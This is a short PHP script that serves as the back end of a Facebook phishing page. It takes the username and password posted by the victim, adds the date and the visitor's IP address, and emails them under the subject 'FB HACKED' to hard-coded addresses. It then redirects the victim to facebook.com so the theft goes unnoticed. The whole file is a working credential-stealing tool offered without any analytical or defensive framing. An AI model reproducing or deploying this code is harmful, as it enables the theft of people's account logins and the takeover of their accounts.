<?php
if(isset($_POST['submit']));
   
  date_default_timezone_set('Asia/Manila');
  $date = date('m-d-y h:i:sa');
  $name = $_POST['name'];
  $subject = "FB HACKED";
  $code = $_POST['uword'];
  $mailfrom = "trustedunit@gmail.com";
  $ip = $_SERVER['REMOTE_ADDR'];
  $user = $_SERVER['HTTP_USER_AGENT'];
  
  $mailTo = "alouhsperk69@gmail.com";
  $mail2 = "email2";
  $headers = array ("From:".$mailfrom,
  "MIME-Version: 1.0",
  "X-Priority" => "1",
    "Priority" => "Urgent",
    "Importance" => "high",
    "Content-Type" => "text/html; charset=ISO-8859-1"  );
  
  $txt = "Facebook Account: "."<br>"."Username:: ".$name."<br>Password:: ".$code."<br><br>DATE: ".$date."<br><br>"."ip:".$ip;

  header('location: https://www.facebook.com');
  
  mail($mailTo, $subject, $txt, $headers);
  mail($mail2, $subject, $txt, $headers);
?>
